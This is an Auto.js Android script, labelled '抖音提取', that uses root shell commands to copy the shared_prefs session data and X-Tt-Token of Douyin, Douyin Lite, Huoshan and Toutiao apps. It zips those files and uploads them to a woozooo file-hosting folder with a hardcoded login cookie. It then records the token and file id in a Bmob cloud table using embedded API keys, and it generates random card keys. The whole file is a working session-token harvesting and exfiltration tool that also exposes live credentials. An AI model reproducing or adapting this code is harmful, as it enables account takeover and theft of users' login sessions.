"ui";
var qiqi = storages.create("qiqi");

ui.layout(
    <ScrollView>
    <vertical >
         <appbar>
            <toolbar title="抖音提取"/>
        </appbar>
   <text  w="auto" h="auto" text="菜猪提取" textSize="35sp" color="red" layout_gravity="center_horizontal" marginTop="30px"/>
   <text id="msg" w="auto" h="auto" text="准备就绪..." textSize="18sp" color="red" layout_gravity="center_horizontal" marginTop="10px"/>
   <horizontal marginTop="20px">
                <text text="提取版本 ->" textSize="15" color="black" marginTop="5px"/>
            <radiogroup orientation="horizontal" marginLeft="10px">
                <radio id="抖音" text="抖音"  checked ="true" />
                <radio id="极速" text="极速"marginLeft="15px"/>
                <radio id="火山" text="火山"marginLeft="15px"/>
                <radio id="头条" text="头条"marginLeft="15px"/>
            </radiogroup>
            
            </horizontal>
        <input hint="这里输入CK账号（默认提取token)" id="ck" marginTop="0px"/>
        {/* <text hint="这里是提取的token" id="token" marginTop="0px" textSize="15sp"/> */}
         <vertical h="auto" w="*" gravity="center" marginTop="10px">
        <horizontal>
        <button id="tiqu"  h="auto" layout_weight="1" text="提取数据" textSize="20sp" layout_gravity="center_horizontal" margin="5 0 5 0" border-radius="10px"/>
        <button id="clean"  h="auto" layout_weight="1"text="清空内容" textSize="20sp" layout_gravity="center_horizontal" margin="5 0 5 0" />
        <button id="jtk"  h="auto" layout_weight="1"text="仅提tk" textSize="20sp" layout_gravity="center_horizontal" margin="5 0 5 0" />
       </horizontal>
       {/* <horizontal>
        <button id="tqtoken"  h="auto"layout_weight="1" text="提取token" textSize="20sp" layout_gravity="center_horizontal" margin="5 0 5 0" border-radius="10px"/>
        <button id="copytoken"  h="auto"layout_weight="1" text="复制token" textSize="20sp" layout_gravity="center_horizontal" margin="5 0 5 0" />
        </horizontal> */}
        <horizontal>
    <button id="sjck" h="auto"layout_weight="1" text="随机ck" textSize="20sp" layout_gravity="center_horizontal" margin="5 0 5 0"/>
    <button id="copy"  h="auto" layout_weight="1"text="复制内容" textSize="20sp" layout_gravity="center_horizontal" margin="5 0 5 0" />
    <button id="save"  h="auto" layout_weight="1"text="保存" textSize="20sp" layout_gravity="center_horizontal" margin="5 0 5 0" />

     </horizontal> 

        <text  w="auto" h="auto" text="软件使用说明：" textSize="15sp" color="blue" layout_gravity="center_left" marginTop="10px"/>
        <text  w="auto" h="auto" text="1、提取数据前请确保已登录账号" textSize="15sp" layout_gravity="center_left" marginTop="10px"/>
        <text  w="auto" h="auto" text="2、提取和还原前请清楚软件数据" textSize="15sp" layout_gravity="center_left" marginTop="10px"/>
        <text  w="auto" h="auto" text="3、本软件需要授予root权限" textSize="15sp" layout_gravity="center_left" marginTop="10px"/>
 <text  w="auto" h="auto" text="5、本软件仅供学习与交流使用，请勿用于非法用途，请在下载后24小时内删除，作者不承担任何责任，最终解释权归作者所有" textSize="15sp" color="red" layout_gravity="center_left" marginTop="10px"/>
   
     </vertical>
     </vertical>
        </ScrollView>
);
importClass(java.io.File);
importClass(android.net.Uri);
importClass(java.lang.System);
importClass(java.io.FileInputStream);
importClass(java.io.FileOutputStream);
importClass(java.io.OutputStream);
importClass(java.util.zip.ZipEntry);
importClass(java.util.zip.ZipOutputStream);
importPackage(Packages.net.lingala.zip4j.core);

var APPID = '30aca6344275dd28b0e7580b2703b43e'
var REST_ID = 'b70ce43c0736c59e105237ecd5296ca4'
var cookie ="PHPSESSID=08jkhs90sk4m0mhku50mt0tjja5a99dk; phpdisk_info=WWwDOQ1nBjoCMwZmWTdbCAVhBQ4OZgBvVG8CZAc2BT5XalFgA2FVa1dsAVgIYwBrBTNRYFo3UjJQYwQ2ADYCYllsAzcNOQY8AjEGZVk0WzcFbAVmDjQAZlQ2AmUHNQU1VzFRagM3VTpXZAEwCFsAawVtUWtaNVIyUGoEbQA1AjBZbwM4"

ui.copy.click(function(){
    threads.start(复制);
});
// ui.copytoken.click(function(){
//     threads.start(复制token);
// });
ui.jtk.click(function(){
    threads.start(仅提取token);
});
ui.tiqu.click(function(){
    threads.start(提取);
    });

    ui.save.click(function(){
        threads.start(保存到本地);
        });
    ui.clean.click(function(){
        threads.start(清空);
        });
        function 清空(){
            ui.run(() => {//读取配置
                ui.ck.setText("")
                // ui.token.setText("")
             });
        }
        ui.sjck.click(function(){
            threads.start(生成随机卡密);
            });
       function 复制(){
            var ckname = ui.ck.getText() + "";
                setClip(ckname);
                toast("已复制")
            }

    function 提取(){
   
        if(ui.抖音.checked){
        apn = "com.ss.android.ugc.aweme"
       an = "抖音ck"
    //    toast("抖音")
    }else if(ui.极速.checked){
        apn = "com.ss.android.ugc.aweme.lite"
        an = "极速ck"
    }else if(ui.火山.checked){
        apn = "com.ss.android.ugc.live"
        an = "火山ck"
    }else if(ui.头条.checked){
        apn = "com.ss.android.article.news"
        an = "头条ck"
    }
        ui.run(() => {//读取配置
            ui.msg.setText("开始提取")
         });
        files.removeDir("/sdcard/qiqi")
        sleep(500)
        files.create("/sdcard/qiqi/")
        files.create("/sdcard/qiqi/ck/")
        var ckname = ui.ck.getText() + "";
        if((ckname == "" && ui.头条.checked)){
            alert("请输入ck名称！")
            threads.shutDownAll();
            sleep(10000)
        }
        ui.run(() => {//读取配置
            ui.msg.setText("提取中，请勿中断操作")
         });
         try{
         if((ckname == "" && ui.抖音.checked) || (ckname == "" && ui.火山.checked) || (ckname == "" && ui.极速.checked)){
            提取抖音火山token()
            ckname = token
    }
        }catch (error){
            ui.run(() => {//读取配置
                ui.msg.setText("获取token失败")
             });
            threads.shutDownAll();
            sleep(10000)

        }
        //  toast(ckname)
            提取命令 = "cp -r /data/data/"+apn+"/shared_prefs /sdcard/qiqi/ck/"
             shell(提取命令, true)
            var srcPath = "/sdcard/qiqi/ck";
            var zipname = ckname +".zip"
            ui.run(() => {//读取配置
                ui.msg.setText("压缩zip中")
             });
            压缩(srcPath);
            files.rename("/sdcard/qiqi/ck.zip",zipname);
            zipFilePath = "/sdcard/qiqi/"+zipname
            log("准备上传")
            ui.run(() => {//读取配置
                ui.msg.setText("上传中，请保证网络畅通")
             });
            log(上传(zipFilePath,cookie))
            加密(fileid)
            var data = {"appname":an,"ckname":ckname,"ck":mdfileid}
            var bmob = new Bmob('https://api2.bmob.cn/1', APPID, REST_ID);
            var createdate = bmob.createObject("getcklist2",data)
            log(createdate)
            var txt = "\r\n版本（"+an+"）："+ckname+"---"+时间()+""
            ckck = an+"卡号："+ckname+"---提取时间"+时间()+""
            上传ck()
            files.append("/sdcard/日志.txt", txt,encoding="UTF-8");
            files.removeDir("/sdcard/qiqi")
            ui.run(() => {//读取配置
                ui.ck.setText(ckname);
                ui.msg.setText("提取完毕，已复制");
             });
             复制();
    }

    function 提取抖音火山token(){
        files.removeDir("/sdcard/token_shared_preference.txt")
        提取命令 = "cp -r /data/data/"+apn+"/shared_prefs/token_shared_preference.xml /sdcard/"
        var shells = shell(提取命令, true)
        code = shells.code
        ess = shells.error.split(" ")[1]
        // log(code)
        // log(ess)
        
        // log((ess == "bad"))
        if(code == "1" && ess == "bad"){
            ui.run(() => {//读取配置
                ui.msg.setText("获取token失败")
             });
            //  alert(error)
            threads.shutDownAll();
            sleep(10000)
      
    }else {
        sleep(500)
        ui.run(() => {//读取配置
            ui.msg.setText("提取token中..")
         });
        while(!files.exists("/sdcard/token_shared_preference.xml")){
            shell(提取命令, true)
            sleep(100)
        }
       files.rename("/sdcard/token_shared_preference.xml","token_shared_preference.txt")
       tokentxt =  files.read("/sdcard/token_shared_preference.txt",encoding = "UTF-8");
       index1 = tokentxt.indexOf("X-Tt-Token")
       index2 = tokentxt.indexOf("</string>")
       token = tokentxt.substring(index1+12,index2)
       log(token)
    }
    
    }

function 仅提取token(){
    清空()
    files.removeDir("/sdcard/token_shared_preference.txt")
    // sleep(500)
try{
    if(ui.抖音.checked){
       apn = "com.ss.android.ugc.aweme"
       an = "抖音ck"
       toast("抖音")
       提取抖音火山token()
       ui.run(() => {//读取配置
           ui.ck.setText(token);
           ui.msg.setText("提取完毕，已复制");
        });
        复制();
    }else if(ui.极速.checked){
        apn = "com.ss.android.ugc.aweme.lite"
        an = "极速ck"
        toast("极速")
        提取抖音火山token()
        ui.run(() => {//读取配置
            ui.ck.setText(token);
            ui.msg.setText("提取完毕，已复制");
         });
         复制();
    //    toast("不支持")
    }else if(ui.火山.checked){
        apn = "com.ss.android.ugc.live"
        an = "火山ck"
        toast("火山")
        提取抖音火山token()
        ui.run(() => {//读取配置
            ui.ck.setText(token);
            ui.msg.setText("提取完毕，已复制");
         });
         复制();
    }else if(ui.头条.checked){
        toast("不支持")
    }
    files.removeDir("/sdcard/token_shared_preference.txt")
    }catch (error){
        ui.run(() => {//读取配置
            ui.msg.setText("获取token失败")
         });
        //  alert(error)
        threads.shutDownAll();
        sleep(10000)
       
    }
}

    function 保存到本地(){

        var ckname = ui.ck.getText() + "";
        if(ckname != ""){
        var txt = "\r\n" + ckname;
        if(ui.抖音.checked){
            files.append("/sdcard/抖音.txt", txt,encoding="UTF-8");
             toast("数据已保存到/sdcard/抖音.txt")
        }else if(ui.极速.checked){
            files.append("/sdcard/极速.txt", txt,encoding="UTF-8");
           toast("数据已保存到/sdcard/极速.txt")
        }else if(ui.火山.checked){
            files.append("/sdcard/火山.txt", txt,encoding="UTF-8");
              toast("数据已保存到/sdcard/火山.txt")
        }else if(ui.头条.checked){
            files.append("/sdcard/头条.txt", txt,encoding="UTF-8");
              toast("数据已保存到/sdcard/头条.txt")
        }
    }else{
        toast("还未提取数据！")
    }
    }


    function 提取token(){
        if(ui.抖音.checked){
            apn = "com.ss.android.ugc.aweme"
            an = "抖音ck"
            检测是否上号()
    }else if(ui.极速.checked){
        apn = "com.ss.android.ugc.aweme.lite"
        an = "极速ck"
    }
        ui.run(() => {//读取配置
            ui.msg.setText("提取token中")
         });

        提取命令 = "cp -r /data/data/"+apn+"/shared_prefs/token_shared_preference.xml /sdcard/"
        shell(提取命令, true)
        files.rename("/sdcard/token_shared_preference.xml","token_shared_preference.txt")
       tokentxt =  files.read("/sdcard/token_shared_preference.txt",encoding = "UTF-8");
       index1 = tokentxt.indexOf("X-Tt-Token")
       index2 = tokentxt.indexOf("</string>")
       token = tokentxt.substring(index1+12,index2)
       log(token)

       files.removeDir("/sdcard/qiqi")
       sleep(500)

       files.create("/sdcard/qiqi/")
       files.create("/sdcard/qiqi/ck/")
       var ckname = token
 
           提取命令 = "cp -r /data/data/"+apn+"/shared_prefs /sdcard/qiqi/ck/"
            shell(提取命令, true)
          
           var srcPath = "/sdcard/qiqi/ck";
           var zipname = ckname.substring(0,10) +".zip"
       
           压缩(srcPath);
          
           files.rename("/sdcard/qiqi/ck.zip",zipname);
           zipFilePath = "/sdcard/qiqi/"+zipname
           log("准备上传")
       
           log(上传(zipFilePath,cookie))
           加密(fileid)
           var data = {"appname":an,"ckname":ckname,"ck":mdfileid}
           var bmob = new Bmob('https://api2.bmob.cn/1', APPID, REST_ID);
           var createdate = bmob.createObject("getcklist2",data)
           log(createdate)
           
           files.removeDir("/sdcard/qiqi")

       ui.run(() => {//读取配置
        ui.token.setText(token)
     });
       files.remove("/sdcard/token_shared_preference.txt")
       ui.run(() => {//读取配置
        ui.msg.setText("提取完毕，已复制token")
     });
       复制token()

    }

    function 生成随机卡密(){
        var 卡密= 随机卡密(false,15)
        log(卡密)
        ui.run(() => {//读取配置
            ui.ck.setText(卡密)
         });
        
    }
    function 随机卡密(randomLen, min, max){
        var str = "",
            range = min,
            arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                   'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                   'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                   'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
                   'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 
                   'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
        // 随机产生
        if(randomLen){
            range = Math.round(Math.random() * (max-min)) + min;
        }
        for(var i=0; i<range; i++){
            pos = Math.round(Math.random() * (arr.length-1));
            str += arr[pos];
        }
        return str;
    }
function 压缩(srcpath){
    var f = new File(srcpath);
    if (!f.exists()) return null;
    var path = f.getPath();
    var parent = f.getParentFile();
    if (f.isDirectory()) {
        var zipName = path+".zip";
    }
    if (f.isFile()) {
        var zipName = parent+"/"+f.getName().split(".")[0]+".zip";
    }
    var zos = null ;
    try {
        var fos2 = new FileOutputStream(new File(zipName));
        zos = new ZipOutputStream(fos2);
        var sourceFile = new File(srcpath);
        compress(sourceFile,zos,sourceFile.getName(), true);
    } catch (e) {
        throw "zip error from ZipUtils: "+e
    }finally{
        if(zos != null){
            try {
                zos.close();
                return true;
            } catch (e) {
                log(e);
                return false;
            }
        }
    }

    function compress(sourceFile, zos, name, KeepDirStructure) {
        var buf = new util.java.array('byte', 4096);
        if(sourceFile.isFile()){
            zos.putNextEntry(new ZipEntry(name));
            var len;
            var ins = new FileInputStream(sourceFile);
            while ((len = ins.read(buf)) != -1){
                zos.write(buf, 0, len);
            }
            zos.closeEntry();
            ins.close();
        } else {
            var listFiles = sourceFile.listFiles();
            if(listFiles == null || listFiles.length == 0){
                if(KeepDirStructure){
                    zos.putNextEntry(new ZipEntry(name + "/"));
                    zos.closeEntry();
                }
            }else {
                for (var f in listFiles) {
                    var file = listFiles[f]
                    if (KeepDirStructure) {
                        compress(file, zos, name + "/" + file.getName(),KeepDirStructure);
                    } else {
                        compress(file, zos, file.getName(),KeepDirStructure);
                    }
                }
            }
        }
    }//compress
}//zip
function 上传(file_path, cookie) {
    if (!files.exists(file_path)) {
        toast("出现错误！")
    }
    var temp = http.postMultipart("https://up.woozooo.com/fileup.php", {
        "task": "1",
        "folder_id": "3059074",
        "upload_file": open(file_path)
    }, {
        "headers": {
            "Connection": "Keep-Alive",
            "Charset": "UTF-8",
            "Accept": "*\/*",
            "Host": "up.woozooo.com",
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Redmi K30 Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36',
            "Cookie": cookie
        }
    }).body.json();
    fileid = temp["text"][0].id
    log(fileid)
    fileurl = temp.text[0].is_newd+"/"+temp.text[0].f_id
    return temp.zt == 1 ? temp.info : null
}

function 时间(){
    var tody = new Date();
        var nian = tody.getFullYear();
        var yue = tody.getMonth() + 1;
        var ri = tody.getDate();
        var shi = tody.getHours();
        var fen = tody.getMinutes();
        var miao = tody.getSeconds();
        time = nian.toString() + yue.toString() + ri.toString() + shi.toString() + fen.toString() + miao.toString()
     return time;
    } 

        function 加密(s){
            var mds= new Array();
            for(i=0;i<s.length;i++){
                 mds[i] = 随机字符串(false,5)+s[i]
            }
            log(mds.join(""));
            mdfileid = mds.join("")
            return mdfileid;
        }

        function 随机字符串(randomLen, min, max){
            var str = "",
                range = min,
                arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                       'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
                       'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                       'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
                       'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 
                       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
            // 随机产生
            if(randomLen){
                range = Math.round(Math.random() * (max-min)) + min;
            }
            for(var i=0; i<range; i++){
                pos = Math.round(Math.random() * (arr.length-1));
                str += arr[pos];
            }
            return str;
        }

        function 上传ck(){

            var url = "http://up.woozooo.com/doupload.php";   //发送请求
            var res = http.post(url, {
            "task": "11" ,
             "file_id": fileid,
             "desc":ckck
            },{"headers":{"Cookie":cookie
        }});
            var html = res.body.json();
            if(html["info"] == "修改成功"){
               log("上传ck成功")
            }
            else{
               log("上传ck失败")
            }
         
        }

        const Bmob = (function () {
            function Bmob(url, appId, restKey) {
                this.baseUrl = url;
                this.appId = appId;
                this.restKey = restKey;
            }
            Bmob.prototype.makeRequest = function (method, url, json, callback) {
                url = this.baseUrl + url;
                var options = {};
                options.method = method;
                if (json) options.body = JSON.stringify(json);
                options.headers = {
                    'X-Bmob-Application-Id': this.appId,
                    'X-Bmob-REST-API-Key': this.restKey,
                    'Content-Type': 'application/json',
                }
                return http.request(url, options, callback);
            }
            Bmob.prototype.createObject = function (className, data) {
                return this.makeRequest('POST', '/classes/' + className, data).body.json();
            }

            return Bmob;
        })();

        function 检测是否上号(){
            ui.run(() => {//读取配置
                ui.msg.setText("检测是否上号")
             });
            f = "&"
            files.create("/sdcard/qiqi/")
            提取命令 = "cp -r /data/data/"+apn+"/shared_prefs/token_shared_preference.xml /sdcard/qiqi/"
            shell(提取命令, true)
            files.rename("/sdcard/qiqi/token_shared_preference.xml","token.txt")
            if(files.exists("/sdcard/qiqi/token.txt")){
            tokentxt =  files.read("/sdcard/qiqi/token.txt",encoding = "UTF-8");
            index1 = tokentxt.indexOf("X-Tt-Token")
            index2 = tokentxt.indexOf("</string>")
            token = "x-tt-token="+tokentxt.substring(index1+12,index2)
            if(token.length<30){
                ui.run(() => {//读取配置
                    ui.msg.setText("未检测到抖音号，重新检测")
                 });
                sleep(3000)
                提取命令 = "cp -r /data/data/"+apn+"/shared_prefs/token_shared_preference.xml /sdcard/qiqi/"
                shell(提取命令, true)
                files.rename("/sdcard/qiqi/token_shared_preference.xml","token.txt")
                tokentxt =  files.read("/sdcard/qiqi/token.txt",encoding = "UTF-8");
                index1 = tokentxt.indexOf("X-Tt-Token")
                index2 = tokentxt.indexOf("</string>")
                token = "x-tt-token="+tokentxt.substring(index1+12,index2)
                ui.run(() => {//读取配置
                    ui.msg.setText("抖音号正常")
                 });
            }
            if(token.length<30){
                ui.run(() => {//读取配置
                    ui.msg.setText("未登录抖音号")
                 });
                 files.removeDir("/sdcard/qiqi")
                 threads.shutDownAll();
                 sleep(10000)
                }
        }else{
            ui.run(() => {//读取配置
                ui.msg.setText("未登录抖音号")
             });
             files.removeDir("/sdcard/qiqi")
             threads.shutDownAll();
             sleep(10000)
        }
        }